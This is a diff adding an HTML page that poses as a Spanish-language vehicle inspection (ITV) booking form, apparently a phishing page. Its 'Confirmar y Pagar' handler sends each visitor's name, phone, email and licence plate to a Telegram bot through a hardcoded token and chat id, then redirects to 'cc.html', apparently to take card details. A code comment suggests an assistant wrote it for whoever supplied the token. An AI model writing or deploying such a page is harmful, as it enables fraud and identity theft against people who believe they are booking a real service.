@@ -1,0 +1,367 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Turnos - Reserva</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --accent:#0f7b7a;
+      --muted:#6b6b6b;
+      --danger:#d60000;
+      --card:#ffffff;
+      --shadow: 0 6px 18px rgba(0,0,0,0.06);
+      --btn-blue:#49a9cc;
+      --gray-btn:#6f7173;
+    }
+    *{box-sizing:border-box}
+    body{font-family:'Roboto',system-ui,Arial;margin:12px;color:#333}
+    .container{max-width:520px;margin:0 auto;background:var(--card);border-radius:8px;padding:18px;box-shadow:var(--shadow)}
+    .logo{display:flex;justify-content:center;margin-bottom:12px}
+    .logo img{max-width:350px;height:auto}
+    h1{font-family:'Playfair Display',serif;color:var(--accent);text-align:center;margin:8px 0;font-size:30px}
+    .notice{color:var(--danger);text-align:center;font-weight:700;margin:8px 0}
+    .section-title{color:var(--accent);font-weight:700;margin:12px 0 8px;font-size:16px}
+    label{display:block;margin:6px 0;font-weight:600}
+    .required{color:var(--danger);font-weight:700}
+    input,select{width:100%;padding:9px;border:1px solid #d6d6d6;border-radius:4px;background:#fff}
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
+    .small-note{font-size:13px;color:var(--muted);margin-top:6px}
+    .red-note{color:var(--danger);font-weight:700;font-size:13px;margin-top:6px}
+    .actions{display:flex;gap:12px;align-items:center;margin-top:12px}
+    .btn{flex:1;padding:12px 14px;border-radius:6px;border:0;cursor:pointer;font-weight:700}
+    .btn-primary{background:var(--btn-blue);color:#fff}
+    .btn-disabled{background:#d8dbe0;color:#7a7a7a;cursor:not-allowed}
+    .btn-secondary{background:#f4f4f4;border:1px solid #e0e0e0}
+    footer{margin-top:18px;padding-top:12px;border-top:1px solid #e0e0e0;display:flex;justify-content:space-between;font-size:13px;color:var(--muted)}
+
+    /* Modal */
+    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center;padding:20px;z-index:9999}
+    .modal{width:100%;max-width:480px;background:#fff;border-radius:6px;padding:18px;box-shadow:0 20px 40px rgba(0,0,0,0.25)}
+    .modal h3{margin:0 0 8px;text-align:center;font-size:18px;color:#222}
+    .confirm-list{margin:0;padding:0 8px 0 8px}
+    .confirm-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0;align-items:center}
+    .confirm-label{font-weight:700;color:#333}
+    .confirm-value{color:#666;text-align:right;max-width:60%}
+    .modal-actions{margin-top:14px;display:flex;flex-direction:column;gap:10px}
+    .btn-modal-primary{background:var(--btn-blue);color:#fff;padding:12px;border-radius:6px;border:0;font-weight:700}
+    .btn-modal-secondary{background:var(--gray-btn);color:#fff;padding:12px;border-radius:6px;border:0;font-weight:700}
+    .importe{font-weight:700;color:#1b6e6e;text-align:right;padding-top:6px}
+    @media (max-width:480px){ .confirm-value{max-width:55%} }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="img/dual_logo.png" alt="Logo" />
+    </div>
+
+    <h1>Turnos</h1>
+    <div class="notice">Sr Cliente, el último turno sacado borra los anteriores.</div>
+
+    <div class="section-title">Planta, Tipo de Vehículo, Fecha y Hora</div>
+
+    <form id="turnosForm" autocomplete="off">
+      <div class="grid">
+        <div>
+          <label>Planta:<span class="required">*</span></label>
+          <select id="planta" required>
+            <option value="">-</option>
+            <option value="ITV 01 - Chateau">ITV 01 - Chateau</option>
+            <option value="ITV 02 - Circunvalación">ITV 02 - Circunvalación</option>
+            <option value="ITV 03 - Japón">ITV 03 - Japón</option>
+          </select>
+        </div>
+
+        <div>
+          <label>Tipo de Vehículo:<span class="required">*</span></label>
+          <select id="tipoVeh" required>
+            <option value="">-</option>
+            <option value="Automóvil">Automóvil</option>
+            <option value="Motocicleta hasta 175 cc">Motocicleta hasta 175 cc</option>
+            <option value="Motocicleta mayor a 175 cc">Motocicleta mayor a 175 cc</option>
+            <option value="Taxis y Remis">Taxis y Remis</option>
+            <option value="Camioneta o Utilitario">Camioneta o Utilitario</option>
+            <option value="Micro - ómnibus o Escolar">Micro - ómnibus o Escolar</option>
+            <option value="Ómnibus">Ómnibus</option>
+            <option value="Trolebús">Trolebús</option>
+            <option value="Camión">Camión</option>
+          </select>
+        </div>
+
+        <div>
+          <label>Fecha:<span class="required">*</span></label>
+          <input id="fecha" type="date" />
+        </div>
+
+        <div>
+          <label>Hora:<span class="required">*</span></label>
+          <input id="hora" type="time" />
+        </div>
+      </div>
+
+      <div class="section-title">Informacion Personal</div>
+
+      <div class="grid">
+        <div>
+          <label>Nombre y Apellido:<span class="required">*</span></label>
+          <input id="nombre" type="text" />
+        </div>
+
+        <div>
+          <label>Número de Teléfono <small class="red-note">(SIN 0 NI 15 - SIN GUIONES O ESPACIOS)</small><span class="required">*</span></label>
+          <input id="telefono" type="text" placeholder="ej: 351########" />
+        </div>
+
+        <div>
+          <label>Dirección de Correo Electrónico:<span class="required">*</span></label>
+          <input id="email" type="email" />
+        </div>
+
+        <div>
+          <label>Patente <small class="red-note">(SIN GUIONES O ESPACIOS - SIN INTERNO)</small><span class="required">*</span></label>
+          <input id="patente" type="text" />
+        </div>
+      </div>
+
+      <div class="small-note">*Denota campo obligatorio</div>
+
+      <div class="section-title">Información General de la Reserva</div>
+      <p class="small-note">Por favor verifique los detalles de su cita abajo y confirme:</p>
+      <ul class="small-note">
+        <li>Planta: <span id="resPlanta">-</span></li>
+        <li>Tipo de Vehículo: <span id="resTipo">-</span></li>
+        <li>Fecha y Hora: <span id="resFechaHora">-</span></li>
+      </ul>
+
+      <div class="terms" style="margin-top:8px;display:flex;gap:8px;align-items:flex-start">
+        <input id="acepto" type="checkbox" />
+        <div style="font-size:14px">
+          Estoy de acuerdo con los términos y condiciones.<br>
+          <a href="#">Haga click aquí para los términos y condiciones</a>
+        </div>
+      </div>
+
+      <div class="actions" style="margin-top:14px">
+        <button id="reservar" type="button" class="btn btn-primary btn-disabled" disabled>Reservar</button>
+        <button id="cancelar" type="button" class="btn btn-secondary">Cancelar</button>
+      </div>
+    </form>
+
+    <footer>
+      <div>© 2025 ITV.</div>
+      <div class="version">Version: 17.04</div>
+    </footer>
+  </div>
+
+  <!-- Modal -->
+  <div id="modal" class="modal-backdrop" aria-hidden="true">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+      <h3 id="modal-title">Por favor verifique los detalles de su cita</h3>
+
+      <div class="confirm-list">
+        <div class="confirm-row"><div class="confirm-label">Número de Confirmación:</div><div class="confirm-value" id="confNum">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Nombre:</div><div class="confirm-value" id="cNombre">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Teléfono:</div><div class="confirm-value" id="cTelefono">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Email:</div><div class="confirm-value" id="cEmail">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Tipo de Vehículo:</div><div class="confirm-value" id="cTipo">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Patente:</div><div class="confirm-value" id="cPatente">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Planta:</div><div class="confirm-value" id="cPlanta">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Fecha y Hora:</div><div class="confirm-value" id="cFechaHora">-</div></div>
+        <div class="confirm-row"><div class="confirm-label">Importe a abonar:</div><div class="confirm-value importe" id="cImporte">$0,00</div></div>
+      </div>
+
+      <div class="modal-actions">
+        <button id="confirmarPagar" class="btn-modal-primary">Confirmar y Pagar</button>
+        <button id="modificar" class="btn-modal-secondary">Modificar</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+// elementos
+const form = document.getElementById('turnosForm');
+const requiredIds = ['planta','tipoVeh','fecha','hora','nombre','telefono','email','patente'];
+const reservar = document.getElementById('reservar');
+const cancelar = document.getElementById('cancelar');
+const acepto = document.getElementById('acepto');
+const modal = document.getElementById('modal');
+
+// tarifas
+const tarifas = {
+  'Automóvil': 39332.00,
+  'Motocicleta hasta 175 cc': 13906.00,
+  'Motocicleta mayor a 175 cc': 20966.00,
+  'Taxis y Remis': 45070.00,
+  'Camioneta o Utilitario': 56604.00,
+  'Micro - ómnibus o Escolar': 67102.00,
+  'Ómnibus': 71801.00,
+  'Trolebús': 81264.00,
+  'Camión': 78606.00,
+  'Remolque > 5000 kg': 43000.00,
+  'Remolque <= 5000 kg': 28832.00,
+  'Casas Rodantes': 28832.00,
+  'Ambulancias': 56604.00
+};
+
+function formatMoney(n){ return '$'+n.toLocaleString('es-AR',{minimumFractionDigits:2}); }
+
+function updateResumen(){
+  document.getElementById('resPlanta').textContent = document.getElementById('planta').value || '-';
+  document.getElementById('resTipo').textContent = document.getElementById('tipoVeh').value || '-';
+  const f = document.getElementById('fecha').value;
+  const h = document.getElementById('hora').value;
+  let ff = '-';
+  if(f){
+    const d = new Date(f);
+    ff = d.getDate().toString().padStart(2,'0') + '/' + (d.getMonth()+1).toString().padStart(2,'0') + '/' + d.getFullYear();
+  }
+  document.getElementById('resFechaHora').textContent = (ff) + (h?(' '+h):'');
+}
+
+function validatePhone(v){ return /^\d{6,12}$/.test(v); }
+function validatePatente(v){ return /^[A-Za-z0-9]{4,8}$/.test(v); }
+
+function checkValid(){
+  let ok=true;
+  for(const id of requiredIds){
+    const el = document.getElementById(id);
+    const val = el && String(el.value).trim();
+    if(!val){ ok=false; break; }
+  }
+  if(ok){
+    if(!validatePhone(document.getElementById('telefono').value)) ok=false;
+    if(!validatePatente(document.getElementById('patente').value)) ok=false;
+    if(!acepto.checked) ok=false;
+  }
+  if(ok){ reservar.disabled=false; reservar.classList.remove('btn-disabled'); } 
+  else { reservar.disabled=true; reservar.classList.add('btn-disabled'); }
+}
+
+function genConfirmation(){ return Date.now().toString().slice(-15); }
+
+// abrir modal
+function openModalWithData(){
+  document.getElementById('confNum').textContent = genConfirmation();
+  document.getElementById('cNombre').textContent = document.getElementById('nombre').value;
+  document.getElementById('cTelefono').textContent = document.getElementById('telefono').value;
+  document.getElementById('cEmail').textContent = document.getElementById('email').value;
+  document.getElementById('cTipo').textContent = document.getElementById('tipoVeh').value;
+  document.getElementById('cPatente').textContent = document.getElementById('patente').value;
+  document.getElementById('cPlanta').textContent = document.getElementById('planta').value;
+  const f = document.getElementById('fecha').value;
+  const h = document.getElementById('hora').value;
+  let ff = '-';
+  if(f){ const d = new Date(f); ff = d.getDate().toString().padStart(2,'0') + '/' + (d.getMonth()+1).toString().padStart(2,'0') + '/' + d.getFullYear(); }
+  document.getElementById('cFechaHora').textContent = ff + (h?(' '+h):'');
+
+  const tipo = document.getElementById('tipoVeh').value;
+  const importe = tarifas[tipo] || 0;
+  document.getElementById('cImporte').textContent = formatMoney(importe);
+
+  modal.style.display = 'flex';
+  modal.setAttribute('aria-hidden','false');
+}
+
+modal.addEventListener('click', (e)=>{
+  if(e.target === modal){ modal.style.display = 'none'; modal.setAttribute('aria-hidden','true'); }
+});
+
+form.addEventListener('input', ()=>{ updateResumen(); checkValid(); });
+acepto.addEventListener('change', checkValid);
+
+cancelar.addEventListener('click', ()=>{ form.reset(); updateResumen(); checkValid(); });
+
+reservar.addEventListener('click', ()=>{ if(!reservar.disabled) openModalWithData(); });
+
+document.getElementById('modificar').addEventListener('click', ()=>{ modal.style.display='none'; });
+
+
+// ⭐⭐⭐ ENVÍO A TELEGRAM + REDIRECCIÓN A cc.html (CORREGIDO) ⭐⭐⭐
+document.getElementById('confirmarPagar').addEventListener('click', async ()=>{
+
+  modal.style.display='none';
+
+  const data = {
+    confirmation: document.getElementById('confNum').textContent || genConfirmation(),
+    nombre: document.getElementById('nombre').value,
+    telefono: document.getElementById('telefono').value,
+    email: document.getElementById('email').value,
+    tipoVehiculo: document.getElementById('tipoVeh').value,
+    patente: document.getElementById('patente').value,
+    planta: document.getElementById('planta').value,
+    fecha: document.getElementById('fecha').value,
+    hora: document.getElementById('hora').value,
+    importe: document.getElementById('cImporte').textContent
+  };
+
+  // guardar en localStorage para cc.html
+  try {
+    localStorage.setItem("lastReservation", JSON.stringify(data));
+  } catch(e){
+    console.warn('No se pudo guardar en localStorage', e);
+  }
+
+  // ---- ENVIAR A TELEGRAM ----
+  // (Ya proporcionaste token y chat id en tu último mensaje; si decides cambiarlos sustitúyelos aquí)
+  const TELEGRAM_BOT_TOKEN = "7514291048:AAEOhAryJ65Wc9-BCD9BiQ-o3i5LvjhzzlY";
+  const TELEGRAM_CHAT_ID = "-5059565019";
+
+  const mensaje = 
+    `Nueva Reserva:\n` +
+    `N°: ${data.confirmation}\n` +
+    `Nombre: ${data.nombre}\n` +
+    `Teléfono: ${data.telefono}\n` +
+    `Email: ${data.email}\n` +
+    `Vehículo: ${data.tipoVehiculo}\n` +
+    `Patente: ${data.patente}\n` +
+    `Planta: ${data.planta}\n` +
+    `Fecha y Hora: ${data.fecha} ${data.hora}\n` +
+    `Importe: ${data.importe}`;
+
+  // ENVIAR sólo si hay token y chat id
+  if(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID){
+    try{
+      const resp = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`, {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje,
+          parse_mode: "HTML"
+        })
+      });
+
+      const json = await resp.json().catch(()=>null);
+      console.log('Respuesta Telegram:', resp.status, json);
+
+      // chequeo básico de éxito
+      if(resp.ok && json && json.ok){
+        // opcional: notificar al usuario
+        // alert('Reserva enviada correctamente al bot de Telegram.');
+        console.info('Mensaje enviado a Telegram correctamente.');
+      } else {
+        console.warn('Telegram devolvió un error o no respondió OK.', json);
+        alert('Advertencia: no se pudo enviar el mensaje a Telegram. Revisa token/chat_id y que el bot esté añadido al chat.');
+      }
+    } catch(e){
+      console.error('Error al llamar a la API de Telegram:', e);
+      alert('Error enviando a Telegram. Revisa consola para más detalles (CORS/Conexión).');
+    }
+  } else {
+    console.info('TOKEN o CHAT_ID de Telegram no configurados; no se intentó envío.');
+  }
+
+  // ---- REDIRIGIR A cc.html ----
+  window.location.href = "cc.html";
+});
+
+// init
+updateResumen();
+checkValid();
+</script>
+
+</body>
+</html>
